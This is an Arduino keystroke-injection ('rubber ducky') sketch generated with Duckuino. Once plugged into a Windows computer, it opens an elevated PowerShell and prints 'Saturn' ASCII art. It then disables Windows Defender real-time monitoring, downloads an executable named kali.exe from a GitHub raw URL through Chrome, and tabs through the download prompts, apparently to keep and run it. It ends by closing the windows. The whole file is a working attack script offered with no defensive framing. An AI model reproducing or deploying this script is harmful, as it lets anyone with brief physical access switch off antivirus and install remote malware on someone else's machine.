/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Dukweeno/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream
  Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.print(F("powershell"));

  delay(1000);
  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print(F("Start-Process PowerShell -Verb RunAs"));

  delay(1000);
  typeKey(KEY_RETURN);

  delay(6000);
  typeKey(KEY_LEFT_ARROW);

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("echo"));
  typeKey(KEY_RETURN);
  delay(500);
  Keyboard.print(F(" $$$$$$\             $$\                                   "));
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print(F("$$  __$$\            $$ |                                  "));
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print(F("$$ /  \__| $$$$$$\ $$$$$$\   $$\   $$\  $$$$$$\  $$$$$$$\  "));
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print(F("\$$$$$$\   \____$$\\_$$  _|  $$ |  $$ |$$  __$$\ $$  __$$\ "));
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print(F(" \____$$\  $$$$$$$ | $$ |    $$ |  $$ |$$ |  \__|$$ |  $$ |"));
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print(F("$$\   $$ |$$  __$$ | $$ |$$\ $$ |  $$ |$$ |      $$ |  $$ |"));
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print(F("\$$$$$$  |\$$$$$$$ | \$$$$  |\$$$$$$  |$$ |      $$ |  $$ |"));
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print(F(" \______/  \_______|  \____/  \______/ \__|      \__|  \__|"));
  typeKey(KEY_RETURN);
  delay(100);
  Keyboard.print(F("                                                           "));
  typeKey(KEY_RETURN);
  delay(500);

  typeKey(KEY_RETURN);

  typeKey(KEY_RETURN);

  typeKey(KEY_RETURN);
  delay(1000);
  Keyboard.print(F("Set-MpPreference -DisableRealtimeMonitoring $true"));

  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.print(F("start chrome https://raw.githubusercontent.com/cryptocasino68/payloadkali/main/kali.exe"));

  typeKey(KEY_RETURN);

  delay(5000);
  typeKey(KEY_RETURN);

  delay(1000);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(1000);
  Keyboard.print(F("chrome"));

  delay(1000);
  typeKey(KEY_RETURN);

  delay(5000);
  Keyboard.print(F("chrome://downloads/"));

  delay(500);
  typeKey(KEY_RETURN);

  delay(2000);
  typeKey(KEY_TAB);

  delay(500);
  typeKey(KEY_TAB);

  delay(500);
  typeKey(KEY_TAB);

  delay(500);
  typeKey(KEY_TAB);

  delay(500);
  typeKey(KEY_RETURN);

  delay(1000);
  typeKey(KEY_TAB);

  delay(500);
  typeKey(KEY_RETURN);

  delay(1200);
  typeKey(KEY_F5);

  delay(2000);
  typeKey(KEY_TAB);

  delay(500);
  typeKey(KEY_TAB);

  delay(500);
  typeKey(KEY_RETURN);

  delay(2000);
  typeKey(KEY_TAB);

  delay(500);
  typeKey(KEY_RETURN);

  delay(1000);
  typeKey(KEY_TAB);

  delay(500);
  typeKey(KEY_TAB);

  delay(500);
  typeKey(KEY_RETURN);

  delay(3000);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(500);
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  Keyboard.releaseAll();

  delay(500);
  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
